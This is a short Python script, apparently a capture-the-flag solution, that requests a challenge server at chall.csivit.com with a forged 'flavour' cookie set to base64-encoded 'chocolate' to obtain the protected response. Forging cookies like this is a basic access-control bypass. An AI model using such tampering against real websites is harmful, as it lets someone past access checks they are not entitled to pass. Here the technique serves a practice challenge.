#!/usr/bin/env python

import requests
from base64 import b64encode

cookies = {
    '__cfduid': 'df62b28be6c3d5d3759baaa3822349e191594918992',
    'flavour': b64encode(b'chocolate').decode(),
}

headers = {
    'Connection': 'keep-alive',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
    'Upgrade-Insecure-Requests': '1',
    'DNT': '1',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8,hi-IN;q=0.7,hi;q=0.6,en-GB;q=0.5',
}

r = requests.get('http://chall.csivit.com:30243/', headers=headers, cookies=cookies, verify=False)
print(r.text)